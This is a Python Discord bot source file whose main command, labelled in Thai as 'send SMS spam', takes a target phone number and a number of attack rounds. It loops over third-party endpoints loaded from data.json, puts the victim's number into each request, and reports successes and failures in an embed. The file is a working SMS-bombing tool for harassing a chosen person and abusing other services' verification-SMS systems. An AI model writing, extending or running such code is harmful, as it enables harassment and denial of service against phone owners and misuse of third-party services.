from nextcord import Intents, Interaction, SlashOption, Embed
from nextcord.ext import commands
from requests_futures.sessions import FuturesSession
import json



GUILD_TEST = 000000000000000000

prefix = '!'
intents = Intents.all()
request = FuturesSession()
bot = commands.Bot(command_prefix=prefix, intents=intents)

@bot.slash_command(guild_ids=[GUILD_TEST], description="Ping command")
async def ping(interaction: Interaction):
    await interaction.send('Pong!')

@bot.slash_command(guild_ids=[GUILD_TEST], description="ส่งสแปม SMS")
async def sms(
    interaction: Interaction,
    phone: str = SlashOption(name="phone", description="หมายเลขโทรศัพท์เป้าหมาย", required=True),
    roundNum: int = SlashOption(name="num", description="จำนวนรอบที่โจมตี", required=True)
    ):

    # init message
    embed = Embed(title="ส่งสแปม SMS", description="กำลังส่ง SMS ไปที่เบอร์ ${PHONE}".replace("${PHONE}", phone))
    embed.add_field(name="ทั้งหมด/สำเร็จ/ล้มเหลว", value="0/0/0", inline=True)
    embed.add_field(name="สถานะ", value="รอการทำงาน", inline=True)
    sendMsg = await interaction.send(embed=embed)

    # start spam sms
    urls = json.load(open("data.json"))
    count = 0
    done = 0
    fail = 0

    for _ in range(roundNum):
        for url in urls:
            retry = urls[url][2]

            if not urls[url][2]: retry = 1
            for _ in range(retry):
                #header parse
                if urls[url][3] == None:
                    headers = {
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38",
                        "accept": "*/*",
                        "content-type": "application/json",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin",
                    }
                else:
                    headers = str(urls[url][3]).replace("\'", "\"")
                    headers = headers.replace("${PHONE}", phone)
                    headers = headers.replace("${PHONE[1:]}", phone[1:])
                    headers = json.loads(headers)


                # Body parse
                if urls[url][1] != None:
                    nbody = str(urls[url][1]).replace("\'", "\"").replace("False", "false").replace("True", "true")
                    nbody = nbody.replace("${PHONE}", phone)
                    nbody = nbody.replace("${PHONE[1:]}", phone[1:])
                    try:
                        nbody = json.loads(nbody)
                        body = json.dumps(nbody)
                    except:
                        body = nbody
                else:
                    body = None

                # Url parse
                nUrl = url.replace("${PHONE}", phone).replace("${PHONE[1:]}", phone)

                #send req
                try:
                    req = request.request(urls[url][0], nUrl, data=body, headers=headers, timeout=10)
                except:
                    print("Failed")
                    pass
                result = req.result()

                if str(result.status_code).startswith("2"): done += 1
                else: fail += 1
            count += 1

        # update msg per round
        embed = Embed(title="ส่งสแปม SMS", description="กำลังส่ง SMS ไปที่เบอร์ ${PHONE}".replace("${PHONE}", phone))
        embed.add_field(name="ทั้งหมด/สำเร็จ/ล้มเหลว", value="{}/{}/{}".format(count, done, fail), inline=True)
        embed.add_field(name="สถานะ", value="กำลังทำงาน", inline=True)
        await sendMsg.edit(embed=embed)
    
    # end command
    embed = Embed(title="ส่งสแปม SMS", description="กำลังส่ง SMS ไปที่เบอร์ ${PHONE}".replace("${PHONE}", phone))
    embed.add_field(name="ทั้งหมด/สำเร็จ/ล้มเหลว", value="{}/{}/{}".format(count, done, fail), inline=True)
    embed.add_field(name="สถานะ", value="ทำงานเสร็จสิ้น", inline=True)
    await sendMsg.edit(embed=embed)

bot.run("TOKEN")
